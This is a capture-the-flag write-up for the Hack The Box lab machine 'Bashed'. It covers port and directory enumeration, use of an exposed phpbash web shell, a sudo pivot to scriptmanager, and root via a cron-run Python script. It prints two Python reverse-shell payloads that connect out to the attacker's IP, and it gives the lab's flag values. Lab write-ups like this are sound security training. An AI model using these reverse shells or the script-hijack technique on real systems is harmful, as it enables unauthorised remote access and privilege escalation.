# CTF Writeup Template (Hack The Box

## 🧪 Machine Name: `Bashed`

**Platform:** Hack The Box

**IP Address:** `10.10.10.68`

**Difficulty:** Easy Linux

---

## 🧭 Overview

Bashed is a fairly easy machine which focuses mainly on fuzzing and locating important files. As basic access to the crontab is restricted, 

---

## 🔍 Enumeration

### 🔎 Nmap

```
nmap -p- 10.10.10.68 --min-rate 10000 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-12 17:05 UTC
Nmap scan report for bashed.htb (10.10.10.68)
Host is up (0.17s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 7.56 seconds
➜  bashed nmap -p 80 10.10.10.68 -sCV -oN nmapscan 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-12 17:07 UTC
Nmap scan report for bashed.htb (10.10.10.68)
Host is up (0.16s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Arrexel's Development Site

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.42 seconds
```

ok so only port 80 open so checking http://bashed.htb

website showing a phpbash script in development

![image.png](attachment:4a15d937-c345-448b-9b71-22b70daffcbc:image.png)

```bash
dirsearch -u http://bashed.htb     
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3                                                                                                                  
 (_||| _) (/_(_|| (_| )                                                                                                                         
                                                                                                                                                
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/HTB/bashed/reports/http_bashed.htb/_25-06-12_17-09-33.txt

Target: http://bashed.htb/

[17:09:33] Starting:                                                                                                                            
[17:09:37] 301 -  306B  - /php  ->  http://bashed.htb/php/                  
[17:09:39] 301 -  305B  - /js  ->  http://bashed.htb/js/                    
[17:09:42] 403 -  299B  - /.htaccess.bak1                                   
[17:09:42] 403 -  296B  - /.ht_wsr.txt                                      
[17:09:42] 403 -  299B  - /.htaccess.orig                                   
[17:09:42] 403 -  299B  - /.htaccess.save
[17:09:42] 403 -  301B  - /.htaccess.sample
[17:09:42] 403 -  299B  - /.htaccess_orig                                   
[17:09:42] 403 -  297B  - /.htaccess_sc
[17:09:42] 403 -  300B  - /.htaccess_extra
[17:09:42] 403 -  297B  - /.htaccessBAK
[17:09:42] 403 -  297B  - /.htaccessOLD
[17:09:42] 403 -  298B  - /.htaccessOLD2
[17:09:42] 403 -  290B  - /.html                                            
[17:09:42] 403 -  289B  - /.htm                                             
[17:09:42] 403 -  299B  - /.htpasswd_test                                   
[17:09:42] 403 -  295B  - /.htpasswds                                       
[17:09:42] 403 -  296B  - /.httr-oauth
[17:09:45] 200 -    2KB - /about.html                                       
[17:10:12] 200 -    0B  - /config.php                                       
[17:10:13] 200 -    2KB - /contact.html                                     
[17:10:14] 301 -  306B  - /css  ->  http://bashed.htb/css/                   
[17:10:16] 301 -  306B  - /dev  ->  http://bashed.htb/dev/                   
[17:10:16] 200 -  478B  - /dev/                                             
[17:10:20] 301 -  308B  - /fonts  ->  http://bashed.htb/fonts/               
[17:10:24] 301 -  309B  - /images  ->  http://bashed.htb/images/            
[17:10:24] 200 -  513B  - /images/
[17:10:26] 200 -  661B  - /js/                                              
[17:10:36] 200 -  454B  - /php/                                             
[17:10:44] 403 -  298B  - /server-status                                    
[17:10:44] 403 -  299B  - /server-status/                                   
[17:10:52] 301 -  310B  - /uploads  ->  http://bashed.htb/uploads/          
[17:10:52] 200 -   14B  - /uploads/                                          
                                                                             
Task Completed 
```

dev and upload seem interesting

```bash
gobuster dir -u http://10.10.10.68/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.68/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 311] [--> http://10.10.10.68/images/]
/.php                 (Status: 403) [Size: 290]
/uploads              (Status: 301) [Size: 312] [--> http://10.10.10.68/uploads/]
/php                  (Status: 301) [Size: 308] [--> http://10.10.10.68/php/]
/css                  (Status: 301) [Size: 308] [--> http://10.10.10.68/css/]
/dev                  (Status: 301) [Size: 308] [--> http://10.10.10.68/dev/]
/js                   (Status: 301) [Size: 307] [--> http://10.10.10.68/js/]
/config.php           (Status: 200) [Size: 0]
```

browsing to http://bashed.htb/dev gives access to phpbash.php which spawns a bash shell

```bash
ww-data@bashed
:/var/www/html/dev# whoami

www-data
www-data@bashed
:/var/www/html/dev# cd /home

www-data@bashed
:/home# ls

arrexel
scriptmanager
www-data@bashed
:/home# ls -la

total 16
drwxr-xr-x 4 root root 4096 Dec 4 2017 .
drwxr-xr-x 23 root root 4096 Jun 2 2022 ..
drwxr-xr-x 4 arrexel arrexel 4096 Jun 2 2022 arrexel
drwxr-xr-x 3 scriptmanager scriptmanager 4096 Dec 4 2017 scriptmanager
www-data@bashed
:/home# cd arrexel

www-data@bashed
:/home/arrexel# ls -la

total 32
drwxr-xr-x 4 arrexel arrexel 4096 Jun 2 2022 .
drwxr-xr-x 4 root root 4096 Dec 4 2017 ..
lrwxrwxrwx 1 root root 9 Jun 2 2022 .bash_history -> /dev/null
-rw-r--r-- 1 arrexel arrexel 220 Dec 4 2017 .bash_logout
-rw-r--r-- 1 arrexel arrexel 3786 Dec 4 2017 .bashrc
drwx------ 2 arrexel arrexel 4096 Dec 4 2017 .cache
drwxrwxr-x 2 arrexel arrexel 4096 Dec 4 2017 .nano
-rw-r--r-- 1 arrexel arrexel 655 Dec 4 2017 .profile
-rw-r--r-- 1 arrexel arrexel 0 Dec 4 2017 .sudo_as_admin_successful
-r--r--r-- 1 arrexel arrexel 33 Jun 12 00:03 user.txt
www-data@bashed
:/home/arrexel# cat user.txt

af827e749b08685a006408eaf072b8f3
```

```bash
ww-data@bashed
:/home/arrexel# sudo -l

Matching Defaults entries for www-data on bashed:
env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bashed:
(scriptmanager : scriptmanager) NOPASSWD: ALL
```

```bash
getting reverse shell
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.26",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

stablize shell

```bash
nc -nlvp 1234
listening on [any] 1234 ...
connect to [10.10.14.26] from (UNKNOWN) [10.10.10.68] 54748
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@bashed:/tmp$ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp
<r/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp                   
www-data@bashed:/tmp$ export TERM=xterm-256color
export TERM=xterm-256color
www-data@bashed:/tmp$ ^Z
[1]  + 31072 suspended  nc -nlvp 1234
➜  bashed stty raw -echo; fg; reset
[1]  + 31072 continued  nc -nlvp 1234

```

now we have a stable shell we can use sudo to scriptmanager

```bash
sudo -u scriptmanager /bin/bash
scriptmanager@bashed:/tmp$
```

```bash
/$ cd scripts
scriptmanager@bashed:/scripts$ ls
test.py  test.txt
scriptmanager@bashed:/scripts$ ls -la
total 16
drwxrwxr--  2 scriptmanager scriptmanager 4096 Jun  2  2022 .
drwxr-xr-x 23 root          root          4096 Jun  2  2022 ..
-rw-r--r--  1 scriptmanager scriptmanager   58 Dec  4  2017 test.py
-rw-r--r--  1 root          root            12 Jun 12 00:30 test.txt
scriptmanager@bashed:/scripts$ whoami
scriptmanager
```

looks like script runs as root

```bash
f = open("test.txt", "w")
f.write("testing 123!")
f.close
```

nano [test.py](http://test.py) and replaced it with a reverse shell

```bash
import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("10.10.14.26",80));os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/sh","-i"]);

```

```bash
nc -nlvp 80  
listening on [any] 80 ...
connect to [10.10.14.26] from (UNKNOWN) [10.10.10.68] 43014
/bin/sh: 0: can't access tty; job control turned off
# whoami
root
# cat root.txt
cat: root.txt: No such file or directory
# cd /root
# cat root.txt
249277f71cf2bb8e0ec15a570c8fdfdf
```

## 🧠 Lessons Learned

- What key takeaways did this box teach you?

---

*Writeup by inksec*

*GitHub: [https://github.com/inkedqt]*